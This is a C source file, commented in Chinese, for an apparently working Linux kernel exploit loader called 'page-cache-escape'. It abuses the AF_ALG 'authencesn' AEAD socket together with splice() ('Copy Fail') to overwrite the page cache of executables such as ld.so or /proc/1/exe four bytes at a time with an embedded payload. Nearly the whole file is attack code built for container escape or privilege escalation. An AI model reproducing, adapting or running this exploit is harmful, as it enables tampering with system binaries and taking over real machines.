/*
 * injector.c — C 版 page-cache-escape loader
 *
 * 编译: gcc -c -O2 -fPIC -nostdlib -fno-stack-protector -fno-asynchronous-unwind-tables -o rl.o injector.c
 * 链接: ld -N -shared -nostdlib -e _start -o injector.so rl.o
 *
 * 必须用 -N 链接: 产生单个 RWX LOAD 段，让 Copy Fail 覆写 ld.so page cache 后
 * kernel 能从少量 page 中完整加载 interpreter。标准多段布局会导致代码段加载失败。
 *
 * 约束: 所有函数内变量必须 static（interpreter 模式下栈不可用）
 */

typedef unsigned long u64;
typedef long i64;
typedef unsigned int u32;
typedef unsigned short u16;
typedef unsigned char u8;
typedef unsigned long size_t;

static inline long sys1(long nr, long a1) { long r; __asm__ volatile("syscall":"=a"(r):"a"(nr),"D"(a1):"rcx","r11","memory"); return r; }
static inline long sys2(long nr, long a1, long a2) { long r; __asm__ volatile("syscall":"=a"(r):"a"(nr),"D"(a1),"S"(a2):"rcx","r11","memory"); return r; }
static inline long sys3(long nr, long a1, long a2, long a3) { long r; __asm__ volatile("syscall":"=a"(r):"a"(nr),"D"(a1),"S"(a2),"d"(a3):"rcx","r11","memory"); return r; }
static inline long sys5(long nr, long a1, long a2, long a3, long a4, long a5) { long r; register long r10 __asm__("r10")=a4; register long r8 __asm__("r8")=a5; __asm__ volatile("syscall":"=a"(r):"a"(nr),"D"(a1),"S"(a2),"d"(a3),"r"(r10),"r"(r8):"rcx","r11","memory"); return r; }
static inline long sys6(long nr, long a1, long a2, long a3, long a4, long a5, long a6) { long r; register long r10 __asm__("r10")=a4; register long r8 __asm__("r8")=a5; register long r9 __asm__("r9")=a6; __asm__ volatile("syscall":"=a"(r):"a"(nr),"D"(a1),"S"(a2),"d"(a3),"r"(r10),"r"(r8),"r"(r9):"rcx","r11","memory"); return r; }

#define SYS_READ 0
#define SYS_OPEN 2
#define SYS_CLOSE 3
#define SYS_LSEEK 8
#define SYS_DUP2 33
#define SYS_PIPE 22
#define SYS_NANOSLEEP 35
#define SYS_SOCKET 41
#define SYS_ACCEPT 43
#define SYS_BIND 49
#define SYS_RECVFROM 45
#define SYS_RECVMSG 47
#define SYS_SENDMSG 46
#define SYS_SETSOCKOPT 54
#define SYS_EXIT 60
#define SYS_READLINK 89
#define SYS_SPLICE 275
#define AF_ALG 38
#define SOCK_SEQPACKET 5
#define SOL_ALG 0x117
#define ALG_SET_KEY 1
#define ALG_SET_IV 2
#define ALG_SET_OP 3
#define ALG_SET_AEAD_ASSOCLEN 4
#define ALG_SET_AEAD_AUTHSIZE 5
#define ALG_OP_DECRYPT 0
#define MSG_MORE 0x8000
#define CMSG_ALIGN(n) (((n)+7)&~7)
#define SEEK_SET 0
#define AT_EXECFD 2
#define AT_NULL 0

struct sockaddr_alg { u16 family; u8 type[14]; u32 feat; u32 mask; u8 name[64]; };
struct iovec { void *base; size_t len; };
struct cmsghdr { size_t len; int level; int type; };
struct msghdr { void *name; u32 namelen; u32 _pad; struct iovec *iov; size_t iovlen; void *control; size_t controllen; int flags; };

static void *my_memset(void *s, int c, size_t n) { u8 *p=s; while(n--) *p++=(u8)c; return s; }
static void *my_memcpy(void *d, const void *s, size_t n) { u8 *dd=d; const u8 *ss=s; while(n--) *dd++=*ss++; return d; }

static const u8 key[40] = {0x08,0x00,0x01,0x00,0x00,0x00,0x00,0x10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};

// ============ Copy Fail 写原语（全 static 变量）============

static struct sockaddr_alg g_sa;
static u8 g_aad[8];
static u8 g_cbuf[128];
static struct iovec g_iov;
static struct msghdr g_msg;
static int g_pipefd[2];
static i64 g_src_off;
static u8 g_sink[8192];
static struct iovec g_drain_iov;
static struct msghdr g_drain_msg;

static int patch_chunk(int file_fd, i64 offset, u8 four_bytes[4]) {
    long ctrl = sys3(SYS_SOCKET, AF_ALG, SOCK_SEQPACKET, 0);
    if (ctrl < 0) return -1;
    my_memset(&g_sa, 0, sizeof g_sa);
    g_sa.family = AF_ALG;
    my_memcpy(g_sa.type, "aead", 5);
    my_memcpy(g_sa.name, "authencesn(hmac(sha256),cbc(aes))", 34);
    if (sys3(SYS_BIND, ctrl, (long)&g_sa, sizeof g_sa) < 0) { sys1(SYS_CLOSE,ctrl); return -2; }
    if (sys5(SYS_SETSOCKOPT, ctrl, SOL_ALG, ALG_SET_KEY, (long)key, 40) < 0) { sys1(SYS_CLOSE,ctrl); return -3; }
    sys5(SYS_SETSOCKOPT, ctrl, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, 0, 4);
    long op = sys3(SYS_ACCEPT, ctrl, 0, 0);
    if (op < 0) { sys1(SYS_CLOSE,ctrl); return -4; }

    g_aad[0]='A'; g_aad[1]='A'; g_aad[2]='A'; g_aad[3]='A';
    g_aad[4]=four_bytes[0]; g_aad[5]=four_bytes[1]; g_aad[6]=four_bytes[2]; g_aad[7]=four_bytes[3];

    my_memset(g_cbuf, 0, sizeof g_cbuf);
    u8 *p = g_cbuf;
    struct cmsghdr *cm = (struct cmsghdr *)p;
    cm->len = sizeof(struct cmsghdr)+4; cm->level = SOL_ALG; cm->type = ALG_SET_OP;
    *(u32*)(p+sizeof(struct cmsghdr)) = ALG_OP_DECRYPT;
    p += CMSG_ALIGN(cm->len);
    cm = (struct cmsghdr *)p;
    cm->len = sizeof(struct cmsghdr)+4+16; cm->level = SOL_ALG; cm->type = ALG_SET_IV;
    *(u32*)(p+sizeof(struct cmsghdr)) = 16;
    p += CMSG_ALIGN(cm->len);
    cm = (struct cmsghdr *)p;
    cm->len = sizeof(struct cmsghdr)+4; cm->level = SOL_ALG; cm->type = ALG_SET_AEAD_ASSOCLEN;
    *(u32*)(p+sizeof(struct cmsghdr)) = 8;
    p += CMSG_ALIGN(cm->len);

    g_iov.base = g_aad; g_iov.len = 8;
    my_memset(&g_msg, 0, sizeof g_msg);
    g_msg.iov = &g_iov; g_msg.iovlen = 1;
    g_msg.control = g_cbuf; g_msg.controllen = (size_t)(p - g_cbuf);
    if (sys3(SYS_SENDMSG, op, (long)&g_msg, MSG_MORE) < 0) { sys1(SYS_CLOSE,op); sys1(SYS_CLOSE,ctrl); return -5; }

    if (sys1(SYS_PIPE, (long)g_pipefd) < 0) { sys1(SYS_CLOSE,op); sys1(SYS_CLOSE,ctrl); return -6; }
    g_src_off = 0;
    long n = sys6(SYS_SPLICE, file_fd, (long)&g_src_off, g_pipefd[1], 0, (size_t)offset+4, 0);
    if (n <= 0) { sys1(SYS_CLOSE,g_pipefd[0]); sys1(SYS_CLOSE,g_pipefd[1]); sys1(SYS_CLOSE,op); sys1(SYS_CLOSE,ctrl); return -7; }
    long rem = n;
    while (rem > 0) { long w = sys6(SYS_SPLICE, g_pipefd[0], 0, op, 0, rem, 0); if(w<=0){sys1(SYS_CLOSE,g_pipefd[0]);sys1(SYS_CLOSE,g_pipefd[1]);sys1(SYS_CLOSE,op);sys1(SYS_CLOSE,ctrl);return -8;} rem-=w; }
    // drain: recvmsg + 8192 buffer (buffer 太小内核返回 EMSGSIZE 不执行 AEAD)
    g_drain_iov.base = g_sink; g_drain_iov.len = 8192;
    my_memset(&g_drain_msg, 0, sizeof g_drain_msg);
    g_drain_msg.iov = &g_drain_iov; g_drain_msg.iovlen = 1;
    sys3(SYS_RECVMSG, op, (long)&g_drain_msg, 0);

    sys1(SYS_CLOSE,g_pipefd[0]); sys1(SYS_CLOSE,g_pipefd[1]);
    sys1(SYS_CLOSE,op); sys1(SYS_CLOSE,ctrl);
    return 0;
}

// ============ Payload 区域 ============

static volatile struct __attribute__((packed)) {
    char marker[38];
    u64  len;
    u8   buf[4096];
} payload __attribute__((used)) = {
    .marker = "PAGE_CACHE_INJECTOR_PAYLOAD_MARKER_V01",
    .len = 0,
    .buf = {0},
};

// ============ 找目标 fd ============

static u8 g_magic[4];
static int is_elf(int fd) {
    sys3(SYS_LSEEK, fd, 0, SEEK_SET);
    if (sys3(SYS_READ, fd, (long)g_magic, 4) != 4) return 0;
    return g_magic[0]==0x7f && g_magic[1]=='E' && g_magic[2]=='L' && g_magic[3]=='F';
}

static struct { u64 sec; u64 nsec; } g_delay = {0, 10000000};

// 扫描 fd 3-64 找 ELF
static int scan_existing_elf_fd(void) {
    for (int i = 3; i <= 64; i++) {
        if (sys3(SYS_LSEEK, i, 0, SEEK_SET) >= 0 && is_elf(i))
            return i;
    }
    return -1;
}

static int find_target_fd(u64 *auxv) {
    // 方法 1: AT_EXECFD
    if (auxv) {
        for (u64 *p = auxv; p[0] != AT_NULL; p += 2) {
            if (p[0] == AT_EXECFD && is_elf((int)p[1]))
                return (int)p[1];
        }
    }

    // 方法 2: 扫描 fd 3-64
    {
        int fd = scan_existing_elf_fd();
        if (fd >= 0) return fd;
    }

    // 方法 3: 重试循环 open /proc/self/exe, /proc/thread-self/exe, /proc/1/exe
    for (int retry = 0; retry < 500; retry++) {
        long fd;
        fd = sys2(SYS_OPEN, (long)"/proc/self/exe", 0);
        if (fd >= 0) {
            if (is_elf(fd)) return fd;
            sys1(SYS_CLOSE, fd);
        }
        fd = sys2(SYS_OPEN, (long)"/proc/thread-self/exe", 0);
        if (fd >= 0) {
            if (is_elf(fd)) return fd;
            sys1(SYS_CLOSE, fd);
        }
        fd = sys2(SYS_OPEN, (long)"/proc/1/exe", 0);
        if (fd >= 0) {
            if (is_elf(fd)) return fd;
            sys1(SYS_CLOSE, fd);
        }
        // 每次重试也扫一次 fd
        {
            int sfd = scan_existing_elf_fd();
            if (sfd >= 0) return sfd;
        }
        sys2(SYS_NANOSLEEP, (long)&g_delay, 0);
    }
    return -1;
}

// ============ 覆写目标 ============

static u8 g_block[4];
static u8 g_link_buf[256];
static int g_read_fd;

static int overwrite_target(int target_fd) {
    u64 plen = payload.len;
    if (plen == 0 || plen > 4096) return -1;

    // readlink /proc/self/fd/<fd> 拿到磁盘路径，再 open 它
    // splice 从真实磁盘路径的 fd 读取，写入的就是磁盘 page cache
    g_read_fd = target_fd;
    static u8 fd_path[32];
    fd_path[0]='/'; fd_path[1]='p'; fd_path[2]='r'; fd_path[3]='o';
    fd_path[4]='c'; fd_path[5]='/'; fd_path[6]='s'; fd_path[7]='e';
    fd_path[8]='l'; fd_path[9]='f'; fd_path[10]='/'; fd_path[11]='f';
    fd_path[12]='d'; fd_path[13]='/';
    // 把 target_fd 数字写入路径
    int pos = 14;
    if (target_fd >= 10) fd_path[pos++] = '0' + (target_fd / 10);
    fd_path[pos++] = '0' + (target_fd % 10);
    fd_path[pos] = 0;

    long link_len = sys3(SYS_READLINK, (long)fd_path, (long)g_link_buf, 250);
    if (link_len > 0) {
        g_link_buf[link_len] = 0;
        long alt_fd = sys2(SYS_OPEN, (long)g_link_buf, 0);
        if (alt_fd >= 0 && is_elf(alt_fd)) {
            g_read_fd = alt_fd;
        } else if (alt_fd >= 0) {
            sys1(SYS_CLOSE, alt_fd);
        }
    }

    for (u64 i = 0; i < plen; i += 4) {
        u64 chunk = plen - i;
        if (chunk > 4) chunk = 4;
        my_memcpy(g_block, (const void*)(payload.buf + i), chunk);
        if (chunk < 4) {
            sys3(SYS_LSEEK, g_read_fd, i + chunk, SEEK_SET);
            sys3(SYS_READ, g_read_fd, (long)(g_block + chunk), 4 - chunk);
        }
        if (patch_chunk(g_read_fd, i, g_block) < 0) {
            if (g_read_fd != target_fd) sys1(SYS_CLOSE, g_read_fd);
            sys1(SYS_CLOSE, target_fd);
            return -1;
        }
    }
    if (g_read_fd != target_fd) sys1(SYS_CLOSE, g_read_fd);
    sys1(SYS_CLOSE, target_fd);
    return 0;
}

// ============ 入口点 ============

static u64 _saved_auxv = 1;

// 纯 asm 解析栈，找到 auxv 指针存入 _saved_auxv，然后跳到 C 函数
__attribute__((naked)) void _start(void) {
    __asm__ volatile(
        // rsp 指向: argc, argv[0], ..., argv[argc-1], NULL, envp[0], ..., NULL, auxv...
        "mov (%%rsp), %%rcx\n"             // rcx = argc
        "lea 16(%%rsp,%%rcx,8), %%rbx\n"   // rbx = &envp[0] (skip argc + argv + NULL)
        "1: mov (%%rbx), %%rax\n"           // skip envp
        "add $8, %%rbx\n"
        "test %%rax, %%rax\n"
        "jne 1b\n"
        // rbx 现在指向 auxv
        "mov %%rbx, %0\n"
        "and $-16, %%rsp\n"
        "jmp _start_main\n"
        : "=m"(_saved_auxv)
        :
        : "rax", "rbx", "rcx", "memory"
    );
}

__attribute__((used, visibility("hidden"))) void _start_main(void) {
    u64 *auxv = (u64 *)_saved_auxv;

    int fd = find_target_fd(auxv);
    if (fd < 0) sys1(SYS_EXIT, 10);

    if (fd != 3) {
        sys2(SYS_DUP2, fd, 3);
        sys1(SYS_CLOSE, fd);
        fd = 3;
    }

    int ret = overwrite_target(fd);
    sys1(SYS_EXIT, ret < 0 ? 1 : 0);
}
